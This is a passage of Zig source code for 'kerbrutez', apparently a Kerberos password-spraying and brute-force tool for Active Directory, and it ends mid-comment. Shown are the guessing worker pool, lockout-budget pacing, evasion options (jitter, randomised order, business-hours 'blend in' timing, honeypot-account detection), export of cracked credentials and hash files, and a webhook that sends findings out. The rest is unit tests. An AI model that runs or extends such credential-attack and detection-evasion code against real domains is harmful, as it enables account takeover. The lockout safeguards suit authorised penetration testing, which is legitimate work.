    var it = planned.iterator();
    while (it.next()) |e| {
        const plan = e.value_ptr.*;
        if (plan == 0) continue;
        const recent = budget.windowCount(e.key_ptr.*, now);
        // recent (already logged, this run + others) + new attempts this run.
        if (recent + @as(usize, plan) >= @as(usize, threshold)) {
            at_risk += 1;
            if (recent >= worst_recent) {
                worst_recent = recent;
                worst_user = e.key_ptr.*;
                worst_plan = plan;
                const last = budget.mostRecent(e.key_ptr.*) orelse now;
                worst_ago_min = @divTrunc(now - last, 60);
            }
        }
    }
    if (at_risk == 0) return true;

    logger.warning("[!] COLLISION RISK: {d} target user(s) were sprayed recently — another spray now may lock them out.", .{at_risk});
    logger.warning("[!] e.g. {s}@{s}: {d} attempt(s) in the last {d}m (last ~{d}m ago) + {d} new here >= lockout threshold {d}.", .{ worst_user, domain, worst_recent, window_min, worst_ago_min, worst_plan, threshold });
    logger.warning("[!] Another run may be in progress, or this realm was sprayed within the lockout window.", .{});

    if (flags.yes) {
        logger.warning("[*] --yes set: proceeding despite the collision risk.", .{});
        return true;
    }
    if (!(Io.File.stdin().isTty(io) catch false)) {
        logger.err("[!] No interactive terminal to confirm — refusing to proceed. Re-run with -y/--yes to override.", .{});
        return false;
    }
    printOut(io, "  Proceed anyway and risk locking these accounts? [y/N] ", .{});
    const ans = readLineStdin(io) orelse "";
    const trimmed = std.mem.trim(u8, ans, " \t\r\n");
    const yes = std.ascii.eqlIgnoreCase(trimmed, "y") or std.ascii.eqlIgnoreCase(trimmed, "yes");
    if (!yes) logger.warning("[*] Aborted by operator — no attempts made.", .{});
    return yes;
}

test "plannedAttemptsPerUser counts new attempts per user and respects dedup" {
    const a = std.testing.allocator;
    // Spray: one password across three users -> 1 new attempt each.
    {
        var m = plannedAttemptsPerUser(a, &.{ "alice", "bob", "carol" }, .{ .spray = "Pw1" }, null, "R", false);
        defer freePlannedKeys(a, &m);
        try std.testing.expectEqual(@as(usize, 3), m.count());
        try std.testing.expectEqual(@as(u32, 1), m.get("alice").?);
    }
    // Bruteforce combos: distinct passwords counted per user.
    {
        var m = plannedAttemptsPerUser(a, &.{ "alice:p1", "alice:p2", "bob:p1" }, .bruteforce, null, "R", false);
        defer freePlannedKeys(a, &m);
        try std.testing.expectEqual(@as(u32, 2), m.get("alice").?);
        try std.testing.expectEqual(@as(u32, 1), m.get("bob").?);
    }
    // Dedup skips already-tried combos unless --retry.
    {
        var d = dedup_mod.Dedup.init(a, .realm);
        defer d.deinit();
        try d.add("R", "alice", "p1");
        var m = plannedAttemptsPerUser(a, &.{ "alice:p1", "alice:p2" }, .bruteforce, &d, "R", false);
        defer freePlannedKeys(a, &m);
        try std.testing.expectEqual(@as(u32, 1), m.get("alice").?); // p1 skipped
        var m2 = plannedAttemptsPerUser(a, &.{ "alice:p1", "alice:p2" }, .bruteforce, &d, "R", true);
        defer freePlannedKeys(a, &m2);
        try std.testing.expectEqual(@as(u32, 2), m2.get("alice").?); // --retry counts both
    }
}

fn runPool(
    allocator: Allocator,
    io: Io,
    flags: Flags,
    input: PoolInput,
    mode: workers.Mode,
    stop_on_success: bool,
    force_safe: bool,
    campaign: bool,
    count_noun: []const u8,
    success_noun: []const u8,
    dims: ?SprayDims,
) u8 {
    const domain = flags.domain orelse {
        printErr(io, "domain must not be empty (use -d/--domain)\n", .{});
        return 1;
    };

    var logger = Logger.init(io, flags.verbose, flags.output) catch return 1;
    defer logger.deinit();

    if (flags.delay_ms != 0) logger.info("Delay set. Using single thread and delaying {d}ms between attempts", .{flags.delay_ms});

    var session = buildSession(allocator, io, &logger, flags, force_safe) orelse return 1;
    defer session.deinit();

    // Acquire the work lines from a file/stdin, or use the caller's pre-built list.
    var owned_content: ?[]u8 = null;
    defer if (owned_content) |c| allocator.free(c);
    var owned_lines = false;
    const raw_lines: []const []const u8 = switch (input) {
        .path => |p| blk: {
            owned_content = readInput(allocator, io, p) catch {
                logger.err("could not read input {s}", .{p});
                return 1;
            };
            owned_lines = true;
            break :blk splitLines(allocator, owned_content.?) catch return 1;
        },
        .prebuilt => |l| l,
    };
    defer if (owned_lines) allocator.free(raw_lines);

    // Collapse duplicate work BEFORE any worker starts. Two entries naming the
    // same AD account with the same password are one guess, and sending both
    // spends the account's lockout budget twice for nothing.
    const deduped = dedupeWorkItems(allocator, raw_lines, mode);
    defer if (deduped) |d| allocator.free(d);
    if (deduped) |d| {
        const dropped = raw_lines.len - d.len;
        logger.warning("[*] Collapsed {d} duplicate entr{s} ({d} -> {d}): the same account+password appears more than once (case-insensitive). Each duplicate would spend another of that account's bad-password budget for nothing.", .{ dropped, if (dropped == 1) @as([]const u8, "y") else "ies", raw_lines.len, d.len });
    }
    const lines = deduped orelse raw_lines;

    // Reporting (M10): collect findings; rendered/saved after the run.
    var report = report_mod.Report.init(allocator, count_noun, domain, session.config.realm, session.config.kdc orelse "dns-srv");
    defer report.deinit();
    session.report = &report;

    var pool = workers.Pool{
        .io = io,
        .session = &session,
        .logger = &logger,
        .domain = domain,
        .lines = lines,
        .mode = mode,
        .delay_ms = flags.delay_ms,
        .stop_on_success = stop_on_success,
        .panic_after = flags.panic_after,
        .report = &report,
    };

    // Optional LDAP connection for --policy-fetch / --check-badpwdcount.
    var ldap_client: ldap.Client = undefined; // init in place (stable address)
    var ldap_ok = false;
    defer if (ldap_ok) ldap_client.deinit();
    if (flags.policy_fetch or flags.check_badpwdcount) {
        ldap_ok = ldapConnectBind(allocator, io, flags, domain, &logger, &ldap_client);
        if (!ldap_ok) logger.warning("LDAP unavailable; using the assumed/supplied lockout policy", .{});
    }

    // Lockout policy: supplied knobs, or (with --policy-fetch) the most
    // restrictive policy read from AD.
    var policy = budget_mod.Policy.fromKnobs(flags.lockout_threshold, flags.lockout_window_min, flags.attempts_per_window, flags.window_margin_min);
    // How long a logged lockout keeps an account out of rotation. AD's real
    // lockoutDuration when we fetched it; 0 there means "until an admin
    // unlocks", which correctly maps to "never put it back in rotation".
    var locked_ttl_min: u32 = 30;
    var policy_fetched = false;
    if (flags.policy_fetch and ldap_ok) {
        if (fetchPolicy(allocator, io, &ldap_client, domain, &logger)) |lp| {
            if (lp.threshold_raw == null) {
                // The directory answered but the threshold was missing or
                // unreadable. Treating that as 0 would mean "no lockout policy"
                // and silently switch OFF pacing, lockout prediction and the
                // collision check — a parse hiccup must not disarm the safety
                // machinery. Keep the operator's assumed threshold instead.
                logger.warning("[!] AD returned no readable lockoutThreshold — KEEPING the assumed threshold {d} rather than treating the domain as lockout-free. Verify the policy manually.", .{flags.lockout_threshold});
            }
            policy = lp.toBudget(flags.attempts_per_window, flags.window_margin_min);
            if (lp.threshold_raw == null) policy.threshold = flags.lockout_threshold;
            locked_ttl_min = lp.duration_min;
            policy_fetched = true;
            if (lp.threshold == 0) {
                logger.info("AD lockout policy: NONE (threshold 0) — cadence pacing disabled", .{});
            } else {
                logger.info("AD lockout policy ({s}): threshold {d}, observation window {d} min", .{ lp.source, lp.threshold, lp.observation_window_min });
            }
        }
    }
    const apw = policy.attempts_per_window;
    const enforce_budget = policy.threshold > 0;
    if (policy.clamped()) {
        logger.warning("[!] --attempts-per-window {d} is >= the lockout threshold {d}: that would lock every account in the list. Clamped to {d}.", .{ policy.requested_attempts_per_window, policy.threshold, apw });
    }
    if (enforce_budget and !policy_fetched) {
        // The budget is only as safe as the window it assumes. If the domain's
        // real observation window is LONGER than ours, we hand out a second
        // batch while AD is still counting the first, and the account locks.
        logger.warning("[!] Lockout policy ASSUMED (threshold {d}, {d}-min window), not read from AD. If the domain's real observation window is longer than {d} min this pacing can still lock accounts — use --policy-fetch with LDAP creds to read the true policy.", .{ policy.threshold, policy.window_min, policy.window_min });
    }
    const is_login = switch (mode) {
        .enumerate => false,
        else => true,
    };
    // Shared state (record + dedup + collision check) is on for every
    // password-guessing run unless --no-state; budget PACING is layered on only
    // for campaigns. Enumeration never touches state (it can't lock accounts).
    const state_on = is_login and !flags.no_state;

    // Auto-promote a one-shot run to campaign when the per-user attempt count
    // would blow the lockout budget (only `bruteuser` exceeds 1/user per run).
    const per_user: usize = switch (mode) {
        .bruteuser => lines.len,
        // A combo file (and `spraycampaign`, which builds combos) can hold many
        // passwords for the SAME account. Assuming 1/user here meant a combo
        // list of 50 passwords for one user never auto-promoted to a paced
        // campaign and walked straight into the lockout threshold.
        .bruteforce => maxCombosPerUser(allocator, lines),
        else => 1,
    };
    var effective_campaign = campaign;
    if (!campaign and enforce_budget and per_user > apw) {
        effective_campaign = true;
        const windows_needed = (per_user + apw - 1) / apw;
        const wait_secs: i64 = @as(i64, @intCast(windows_needed - 1)) * (@as(i64, policy.window_min) + policy.margin_min) * 60;
        logger.warning("[*] Override: list ({d}) exceeds {d} attempts / {d}-min window. Switching to campaign mode to avoid account lockout.", .{ per_user, apw, policy.window_min });
        var ebuf: [48]u8 = undefined;
        logger.warning("[*] Estimate: {d} windows, ~{s} wall-clock.", .{ windows_needed, formatDuration(&ebuf, wait_secs) });
        if (wait_secs > 100 * 365 * 24 * 3600) {
            logger.warning("[!] This is effectively infeasible against a locking policy — consider a password spray instead of brute-forcing one user.", .{});
        }
    }

    // Shared per-realm NDJSON store + dedup index for ALL password-guessing runs
    // (so independent/concurrent runs see each other's attempts). The budget is
    // built when a lockout policy applies — it drives the pre-spray collision
    // check, and (campaigns only) the windowed pacing.
    var store_storage: ?store_mod.Store = null;
    var dedup_storage: ?dedup_mod.Dedup = null;
    var budget_storage: ?budget_mod.Budget = null;
    var prior_locked: ?store_mod.LockedSet = null;
    defer if (store_storage) |*s| s.deinit();
    defer if (dedup_storage) |*d| d.deinit();
    defer if (budget_storage) |*b| b.deinit();
    defer if (prior_locked) |*p| p.deinit();
    // The lockout budget is built for EVERY password-guessing run with a policy,
    // state file or not. --no-state means "leave no local artifact", and it used
    // to silently also mean "no pacing and no lockout prediction" — the operator
    // most concerned about footprint got the least protected spray, with only
    // the observed-lockout panic-stop left (which lags by one lockout). The log
    // is needed for CROSS-RUN continuity, not for in-run safety.
    if (enforce_budget) {
        budget_storage = budget_mod.Budget.init(allocator, policy);
        pool.budget = &budget_storage.?;
        pool.pace_budget = effective_campaign;
        pool.lockout_threshold = policy.threshold;
        if (flags.check_badpwdcount and ldap_ok) seedBadPwdCounts(allocator, io, &ldap_client, &budget_storage.?, domain, &logger);
    }
    if (is_login and flags.no_state) {
        logger.warning("[*] --no-state: no local artifact, so NO cross-run dedup, collision check, or memory of accounts locked by earlier runs. In-run pacing and lockout prediction still apply.", .{});
    }

    if (state_on) {
        const state_path = flags.state_path orelse defaultStatePath(session.config.realm);
        const scope: dedup_mod.Scope = if (std.mem.eql(u8, flags.dedup_scope, "none")) .none else .realm;
        const dc = session.config.kdc orelse "dns-srv";

        // Identify this process in the shared log so the budget can tell its own
        // attempts from those of other concurrent runs (see refreshFromLog).
        var run_id_buf: [17]u8 = undefined;
        const run_id = std.fmt.bufPrint(&run_id_buf, "{x}", .{krb5.rng.nonce(io) catch @as(i32, 0)}) catch "run";

        dedup_storage = dedup_mod.loadFromLog(allocator, io, state_path, scope) catch dedup_mod.Dedup.init(allocator, scope);
        store_storage = store_mod.Store.open(allocator, io, state_path, session.config.realm, dc) catch {
            logger.err("could not open state file {s}", .{state_path});
            return 1;
        };
        store_storage.?.run_id = run_id;
        pool.store = &store_storage.?;
        pool.dedup = &dedup_storage.?;
        pool.realm = session.config.realm;
        pool.retry = flags.retry;

        // Accounts an earlier run already found locked/disabled: skip them, and
        // never charge them to this run's --panic-after budget.
        if (!flags.retry_locked) {
            prior_locked = store_mod.loadLockedFromLog(allocator, io, state_path, session.config.realm);
            if (prior_locked.?.count() > 0) {
                pool.prior_locked = &prior_locked.?;
                // A lockout is temporary, and we only learn an account recovered
                // by trying it — so the skip has to age out or it is permanent.
                // Use AD's own lockout duration when we fetched it.
                pool.prior_locked_ttl_secs = @as(i64, locked_ttl_min) * 60;
                logger.warning("[*] {d} account(s) locked/disabled per the state log — pulled from rotation for {d} min (--retry-locked to re-test now).", .{ prior_locked.?.count(), locked_ttl_min });
            }
        }

        // Re-seed the (already built) budget from earlier runs' attempts so a
        // resumed campaign honours the same per-user cadence.
        if (enforce_budget) {
            budget_storage.?.loadFromLog(io, state_path, session.config.realm) catch {};
            // Keep tailing it: other operators' runs must count against the same
            // per-user budget, or together we lock the client's accounts.
            budget_storage.?.log_path = state_path;
            budget_storage.?.log_realm = session.config.realm;
            budget_storage.?.run_id = run_id;
        }

        if (effective_campaign and enforce_budget) {
            logger.info("Campaign state: {s} ({d} prior attempts; dedup {s}); budget {d}/{d}-min per user (threshold {d}); panic-after {d}", .{ state_path, dedup_storage.?.count(), @tagName(scope), apw, policy.window_min, policy.threshold, flags.panic_after });
        } else if (enforce_budget) {
            logger.info("State: {s} ({d} prior attempts; dedup {s}); one-shot (no pacing) — collision check on, panic-stop at {d}", .{ state_path, dedup_storage.?.count(), @tagName(scope), flags.panic_after });
        } else {
            logger.info("State: {s} ({d} prior attempts; dedup {s}); no lockout policy (threshold 0) — pacing & collision check off", .{ state_path, dedup_storage.?.count(), @tagName(scope) });
        }

        // Pre-spray cross-run lockout safeguard (only meaningful with a policy).
        if (enforce_budget) {
            if (!collisionCheckOk(allocator, io, &logger, flags, lines, mode, &dedup_storage.?, &budget_storage.?, session.config.realm, domain, policy.threshold, policy.window_min)) {
                return 2; // operator declined / no TTY to confirm
            }
        }
    }

    // ---- OPSEC governor / canary / ordering (M9) ----
    // Timing + selection noise only; the lockout budget above is never relaxed.
    const prof = opsec.Profile.fromNoise(flags.noise);
    const eff_jitter = flags.jitter_ms orelse prof.jitter_ms;
    const eff_rpm = flags.rpm orelse prof.rpm;
    const eff_randomize = flags.randomize orelse prof.randomize;
    const eff_business = flags.business_hours orelse prof.business_hours;

    if (eff_business) {
        const now_s = Io.Timestamp.now(io, .real).toSeconds();
        if (!opsec.isWithinBusinessHours(now_s, flags.tz_offset, 8, 18)) {
            logger.warning("[opsec] --business-hours: outside 08:00-18:00 Mon-Fri (tz offset {d}h); standing down to blend in", .{flags.tz_offset});
            return 0;
        }
    }

    const seed: u64 = @bitCast(Io.Timestamp.now(io, .real).toMicroseconds());
    if (eff_randomize) {
        var prng = std.Random.DefaultPrng.init(seed);
        prng.random().shuffle([]const u8, @constCast(lines));
        logger.info("[opsec] randomized attempt order ({d} entries)", .{lines.len});
    }

    var governor = opsec.Governor.init(seed ^ 0x9E3779B97F4A7C15, eff_jitter, eff_rpm);
    if (!governor.isNoop()) {
        pool.governor = &governor;
        if (eff_rpm > 0) {
            logger.info("[opsec] noise {d}: jitter <= {d}ms, rate-limited to {d} req/min", .{ @intFromEnum(flags.noise), eff_jitter, eff_rpm });
        } else {
            logger.info("[opsec] noise {d}: jitter <= {d}ms (no rate cap)", .{ @intFromEnum(flags.noise), eff_jitter });
        }
    }

    var canary_set: ?opsec.CanarySet = null;
    defer if (canary_set) |*c| c.deinit();
    if (flags.canary_file) |path| {
        if (opsec.CanarySet.loadFromFile(allocator, io, path)) |cs| {
            canary_set = cs;
            pool.canary = &canary_set.?;
            logger.info("[opsec] canary list loaded: {d} protected account(s) will never be touched", .{cs.count()});
        } else |_| {
            logger.warning("[opsec] couldn't read canary file {s} — proceeding WITHOUT canary protection", .{path});
        }
    }
    baitScan(&logger, mode, lines);

    // Live status block — campaign mode on an interactive terminal only.
    var status_storage: ?status_mod.Status = null;
    if (effective_campaign and (Io.File.stdout().isTty(io) catch false)) {
        status_storage = status_mod.Status{
            .label = switch (mode) {
                .bruteuser => "single-user brute campaign",
                else => "password-spray campaign",
            },
            .total_passwords = if (dims) |d| d.passwords else switch (mode) {
                .bruteuser => lines.len,
                else => 1,
            },
            .total_users = if (dims) |d| d.users else switch (mode) {
                .bruteuser => 1,
                else => lines.len,
            },
            .start_ms = Io.Timestamp.now(io, .awake).toMilliseconds(),
            .attempts = &pool.counter,
            .successes = &pool.successes,
            .locked = &pool.locked_count,
        };
        pool.status = &status_storage.?;
        logger.setStatus(&status_storage.?);
    }

    // Lockout-safety concurrency plan: cap workers at --panic-after and trip the
    // stop early, so even attempts already on the wire can't push the lockout
    // total past the cap. (See planLockoutConcurrency.)
    const plan = planLockoutConcurrency(flags.threads, flags.safe or force_safe, flags.panic_after, is_login);
    pool.panic_trip = plan.panic_trip;
    switch (plan.reason) {
        .unchanged => {},
        .safe => logger.warning("[*] Safe mode: 1 thread (aborts on the first lockout; requested {d}).", .{plan.from}),
        .adjusted => logger.warning("[*] Lockout safety: {d} thread(s); panic-stop trips at {d} lockout(s) so in-flight attempts keep the total within --panic-after {d}.", .{ plan.threads, plan.panic_trip, flags.panic_after }),
    }

    const start = Io.Timestamp.now(io, .awake);
    pool.run(allocator, plan.threads) catch {
        logger.finishStatus();
        logger.err("worker pool failed to start", .{});
        return 1;
    };
    logger.finishStatus();
    const elapsed_ms = Io.Timestamp.now(io, .awake).toMilliseconds() - start.toMilliseconds();
    summary(&logger, count_noun, success_noun, pool.attempts(), pool.validCount(), pool.skippedCount(), elapsed_ms);
    if (pool.lockedCount() > 0) logger.warning("[!] {d} account(s) locked out during this run", .{pool.lockedCount()});
    finalizeReport(allocator, io, &logger, flags, &report);
    return 0;
}

/// Render the report: summary + footprint, optional `--json` to stdout, the
/// `-o <base>.{json,grep.txt,raw.txt,cred.hc<mode>}` files, an always-on
/// auto-saved JSON under the user data dir, and an optional `--webhook` POST.
fn finalizeReport(allocator: Allocator, io: Io, logger: *Logger, flags: Flags, report: *report_mod.Report) void {
    report.summary(logger);

    if (flags.json) {
        var buf: [16 * 1024]u8 = undefined;
        var w = Io.File.stdout().writerStreaming(io, &buf);
        report.writeJson(&w.interface) catch {};
        w.interface.writeByte('\n') catch {};
        w.interface.flush() catch {};
    }

    if (flags.output) |base| {
        writeReportFile(io, base, ".json", report);
        writeReportFile(io, base, ".grep.txt", report);
        writeReportFile(io, base, ".raw.txt", report);
        report.writeCredHashFiles(io, base) catch {};
        logger.info("Wrote report files: {s}.json / .grep.txt / .raw.txt (+ .cred.hc<mode>)", .{base});
    }

    autoSaveReport(allocator, io, logger, flags, report);

    if (flags.webhook) |url| {
        const c = report.counts();
        if (c.valid_creds > 0 or c.expired > 0 or c.locked > 0) {
            var aw: std.Io.Writer.Allocating = .init(allocator);
            defer aw.deinit();
            report.writeJson(&aw.writer) catch return;
            // postWebhook rejects https:// outright, so any webhook that works
            // is plain HTTP — and this body carries cracked credentials and
            // crackable hashes.
            logger.warning("[!] --webhook posts findings (including any cracked credentials) over PLAIN HTTP to {s} — no TLS. Only use a destination on a network you trust.", .{url});
            report_mod.postWebhook(io, allocator, url, aw.writer.buffered()) catch |e| {
                logger.warning("[report] webhook POST failed: {t}", .{e});
                return;
            };
            logger.info("[report] webhook notified ({d} cred(s), {d} locked)", .{ c.valid_creds + c.expired, c.locked });
        }
    }
}

/// Write one report file `<base><suffix>` in the chosen format.
fn writeReportFile(io: Io, base: []const u8, suffix: []const u8, report: *report_mod.Report) void {
    var path_buf: [512]u8 = undefined;
    const path = std.fmt.bufPrint(&path_buf, "{s}{s}", .{ base, suffix }) catch return;
    const f = secret_file.create(io, path, .{ .truncate = true }) catch return;
    defer f.close(io);
    var buf: [16 * 1024]u8 = undefined;
    var w = f.writerStreaming(io, &buf);
    if (std.mem.eql(u8, suffix, ".json")) {
        report.writeJson(&w.interface) catch {};
    } else if (std.mem.eql(u8, suffix, ".grep.txt")) {
        report.writeGrep(&w.interface) catch {};
    } else {
        report.writeRaw(&w.interface) catch {};
    }
    w.interface.flush() catch {};
}

/// Always auto-save the run's findings as JSON under the user data dir
/// ($HOME/.local/share/kerbrutez/logs/). Best-effort; failures are non-fatal.
fn autoSaveReport(allocator: Allocator, io: Io, logger: *Logger, flags: Flags, report: *report_mod.Report) void {
    if (!report.hasFindings()) return;
    // HONOUR --no-state. It documents "leaves no local artifact", but this
    // auto-save was never gated on it — so an operator who picked --no-state
    // precisely to avoid dropping credentials onto a shared jump host or a
    // client-provided VM still had every cracked password written to
    // ~/.local/share/kerbrutez/logs. An artifact the operator never asked for is
    // exactly what --no-state exists to suppress; an explicit -o still writes.
    if (flags.no_state) {
        logger.info("[report] --no-state: skipping the auto-saved findings file (use -o to write one deliberately).", .{});
        return;
    }
    const home = flags.home_dir orelse return;
    var dir_buf: [512]u8 = undefined;
    const dir = std.fmt.bufPrint(&dir_buf, "{s}/.local/share/kerbrutez/logs", .{home}) catch return;
    Io.Dir.cwd().createDirPath(io, dir) catch return;
    const now = Io.Timestamp.now(io, .real).toSeconds();
    var path_buf: [640]u8 = undefined;
    const path = std.fmt.bufPrint(&path_buf, "{s}/kerbrutez-{d}.json", .{ dir, now }) catch return;
    const f = secret_file.create(io, path, .{ .truncate = true }) catch return;
    defer f.close(io);
    var buf: [16 * 1024]u8 = undefined;
    var w = f.writerStreaming(io, &buf);
    report.writeJson(&w.interface) catch {};
    w.interface.flush() catch {};
    _ = allocator;
    logger.info("[report] findings auto-saved to {s}", .{path});
}

/// Warn about input entries that look like honeypot/bait accounts (only the
/// username-bearing modes are scanned). Up to 5 warnings, then a summary.
fn baitScan(logger: *Logger, mode: workers.Mode, lines: []const []const u8) void {
    switch (mode) {
        .enumerate, .spray, .spray_user_as_pass => {
            var shown: u32 = 0;
            var total: u32 = 0;
            for (lines) |u| {
                if (!opsec.looksLikeBait(u)) continue;
                total += 1;
                if (shown < 5) {
                    logger.warning("[opsec] '{s}' looks like a honeypot/bait account — exclude it or use --canary-file", .{u});
                    shown += 1;
                }
            }
            if (total > shown) logger.warning("[opsec] ...and {d} more bait-looking name(s) suppressed", .{total - shown});
        },
        .bruteuser => |u| {
            if (opsec.looksLikeBait(u)) logger.warning("[opsec] target '{s}' looks like a honeypot/bait account — proceed with care", .{u});
        },
        .bruteforce => {},
    }
}

/// Format a duration in seconds as a short human string (s / m / h / d / y).
fn formatDuration(buf: []u8, secs: i64) []const u8 {
    const s = if (secs < 0) 0 else secs;
    if (s < 60) return std.fmt.bufPrint(buf, "{d}s", .{s}) catch "?";
    if (s < 3600) return std.fmt.bufPrint(buf, "{d}m", .{@divTrunc(s, 60)}) catch "?";
    if (s < 86400) return std.fmt.bufPrint(buf, "{d}h {d}m", .{ @divTrunc(s, 3600), @divTrunc(@mod(s, 3600), 60) }) catch "?";
    if (s < 365 * 86400) return std.fmt.bufPrint(buf, "{d}d {d}h", .{ @divTrunc(s, 86400), @divTrunc(@mod(s, 86400), 3600) }) catch "?";
    return std.fmt.bufPrint(buf, "{d} years", .{@divTrunc(s, 365 * 86400)}) catch "?";
}

/// Default per-realm campaign state file in the CWD, e.g.
/// "kerbrutez-example.com.ndjson". Uses static buffers — only called once
/// during single-threaded CLI setup, so the returned slice is safe for the run.
var state_path_buf: [256]u8 = undefined;
var lower_realm_buf: [200]u8 = undefined;
fn defaultStatePath(realm: []const u8) []const u8 {
    const n = @min(realm.len, lower_realm_buf.len);
    for (realm[0..n], 0..) |c, i| lower_realm_buf[i] = std.ascii.toLower(c);
    return std.fmt.bufPrint(&state_path_buf, "kerbrutez-{s}.ndjson", .{lower_realm_buf[0..n]}) catch "kerbrutez-state.ndjson";
}

// ===========================================================================
// Helpers
// ===========================================================================

fn summary(logger: *Logger, count_noun: []const u8, success_noun: []const u8, attempts: u32, valid: u32, skipped: u32, elapsed_ms: i64) void {
    const secs = @as(f64, @floatFromInt(elapsed_ms)) / 1000.0;
    if (skipped > 0) {
        logger.info("Done! Tested {d} {s} ({d} {s}, {d} skipped — already-tried, locked, or canary) in {d:.3} seconds", .{ attempts, count_noun, valid, success_noun, skipped, secs });
    } else {
        logger.info("Done! Tested {d} {s} ({d} {s}) in {d:.3} seconds", .{ attempts, count_noun, valid, success_noun, secs });
    }
}

fn cmdArgError(io: Io, msg: []const u8) u8 {
    printErr(io, "{s}\n", .{msg});
    return 1;
}

/// Split `content` into lines, trimming a trailing '\r' on each.
/// OWNERSHIP: caller frees the returned slice (line contents borrow `content`).
fn splitLines(allocator: Allocator, content: []const u8) ![]const []const u8 {
    var list: std.ArrayList([]const u8) = .empty;
    errdefer list.deinit(allocator);
    var it = std.mem.splitScalar(u8, content, '\n');
    while (it.next()) |line| {
        try list.append(allocator, std.mem.trimEnd(u8, line, "\r"));
    }
    // A trailing newline produces a final empty element; drop it so it isn't
    // processed as a blank record (matches a line scanner's behaviour).
    if (list.items.len > 0 and list.items[list.items.len - 1].len == 0) {
        _ = list.pop();
    }
    return list.toOwnedSlice(allocator);
}

/// Read a whole input (file path, or "-" for stdin). OWNERSHIP: caller frees.
fn readInput(allocator: Allocator, io: Io, path: []const u8) ![]u8 {
    var buf: [64 * 1024]u8 = undefined;
    if (std.mem.eql(u8, path, "-")) {
        var f = Io.File.stdin();
        var r = f.reader(io, &buf);
        return r.interface.allocRemaining(allocator, .unlimited);
    }
    var f = try Io.Dir.cwd().openFile(io, path, .{});
    defer f.close(io);
    var r = f.reader(io, &buf);
    return r.interface.allocRemaining(allocator, .unlimited);
}

fn printOut(io: Io, comptime fmt: []const u8, args: anytype) void {
    var buf: [8192]u8 = undefined;
    var w = Io.File.stdout().writerStreaming(io, &buf);
    w.interface.print(fmt, args) catch return;
    w.interface.flush() catch {};
}

fn printErr(io: Io, comptime fmt: []const u8, args: anytype) void {
    var buf: [8192]u8 = undefined;
    var w = Io.File.stderr().writerStreaming(io, &buf);
    w.interface.print(fmt, args) catch return;
    w.interface.flush() catch {};
}

const testing = std.testing;

test "etypeWarningText: default (all) is unannotated; rc4/aes warn" {
    try testing.expect(etypeWarningText(.all) == null);
    const rc4 = etypeWarningText(.rc4) orelse return error.TestExpectedWarning;
    try testing.expect(std.mem.indexOf(u8, rc4, "DEPRECATED") != null);
    const aes = etypeWarningText(.aes) orelse return error.TestExpectedWarning;
    try testing.expect(std.mem.indexOf(u8, aes, "slower to crack") != null);
}

test "isIpv4Literal distinguishes IPs from hostnames" {
    try testing.expect(isIpv4Literal("10.0.0.10"));
    try testing.expect(isIpv4Literal("192.168.56.11"));
    try testing.expect(!isIpv4Literal("dc01.corp.local"));
    try testing.expect(!isIpv4Literal("corp.local"));
    try testing.expect(!isIpv4Literal("10.0.0"));
}
//testing against GOAD produces null result.
test "discoverDomain derives the domain from a DC FQDN (no network)" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    var threaded: std.Io.Threaded = .init(testing.allocator, .{});
    defer threaded.deinit();
    const io = threaded.io();
    try testing.expectEqualStrings("corp.local", discoverDomain(arena.allocator(), io, "dc01.corp.local", null).?);
    // a :port is stripped first
    try testing.expectEqualStrings("north.sevenkingdoms.local", discoverDomain(arena.allocator(), io, "winterfell.north.sevenkingdoms.local:88", null).?);
    // a bare hostname has no domain part
    try testing.expect(discoverDomain(arena.allocator(), io, "dc01", null) == null);
}

test "parseHideAnswer: empty/EOF/y => hide; n => keep" {
    try testing.expect(parseHideAnswer(null)); // EOF -> default Yes
    try testing.expect(parseHideAnswer("")); // Enter -> default Yes
    try testing.expect(parseHideAnswer("\r\n"));
    try testing.expect(parseHideAnswer("Y"));
    try testing.expect(parseHideAnswer("yes"));
    try testing.expect(!parseHideAnswer("n"));
    try testing.expect(!parseHideAnswer("no"));
    try testing.expect(!parseHideAnswer("N"));
}

// REGRESSION TEST for a wizard that would not stop. `ask` returns "" for BOTH a
// blank line and EOF, so `askReq` re-prompted forever once stdin was exhausted —
// measured at ~4 million "(required)" lines in 5 seconds, pinning a core and
// filling the disk when stdout was redirected. Reachable by `kerbrutez wizard
// < /dev/null`, a scripted run whose input runs short, or an SSH session
// dropping mid-wizard.
test "wizard askReq gives up when stdin is exhausted" {
    var arena_state = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena_state.deinit();

    // Two blank answers, then end of input.
    var r: Io.Reader = .fixed("\n\n");
    var w = Wiz{ .io = undefined, .quiet = true, .arena = arena_state.allocator(), .r = &r };

    // Must return (not hang) and report that input ended.
    const v = w.askReq("wordlist: ");
    try std.testing.expectEqualStrings("", v);
    try std.testing.expect(w.input_ended);

    // A second required prompt still terminates immediately.
    try std.testing.expectEqualStrings("", w.askReq("again: "));
}

test "wizard input layer: trimming, blank/EOF, and menu bounds" {
    var arena_state = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena_state.deinit();

    // CRLF and stray whitespace are stripped (pasted or piped-from-Windows input).
    var r1: Io.Reader = .fixed("  corp.local \r\n");
    var w1 = Wiz{ .io = undefined, .quiet = true, .arena = arena_state.allocator(), .r = &r1 };
    try std.testing.expectEqualStrings("corp.local", w1.askReq("d: "));
    try std.testing.expect(!w1.input_ended);

    // A blank answer is "not supplied", distinct from EOF.
    var r2: Io.Reader = .fixed("\nnext\n");
    var w2 = Wiz{ .io = undefined, .quiet = true, .arena = arena_state.allocator(), .r = &r2 };
    try std.testing.expectEqual(@as(?[]const u8, null), w2.askOpt("optional: "));
    try std.testing.expect(!w2.input_ended);

    // Menu choices outside the range fall back to the default instead of
    // indexing past the options array.
    const opts = [_][]const u8{ "a", "b", "c" };
    var r3: Io.Reader = .fixed("2\n99\n0\nxyz\n-1\n");
    var w3 = Wiz{ .io = undefined, .quiet = true, .arena = arena_state.allocator(), .r = &r3 };
    try std.testing.expectEqual(@as(usize, 1), w3.askChoice("t", &opts)); // "2" -> index 1
    try std.testing.expectEqual(@as(usize, 0), w3.askChoice("t", &opts)); // 99 -> default
    try std.testing.expectEqual(@as(usize, 0), w3.askChoice("t", &opts)); // 0  -> default
    try std.testing.expectEqual(@as(usize, 0), w3.askChoice("t", &opts)); // junk
    try std.testing.expectEqual(@as(usize, 0), w3.askChoice("t", &opts)); // negative
}

// REGRESSION TEST for the identity-normalisation class landing on a SAFETY
// CHECK. plannedAttemptsPerUser drives the pre-spray collision warning ("this
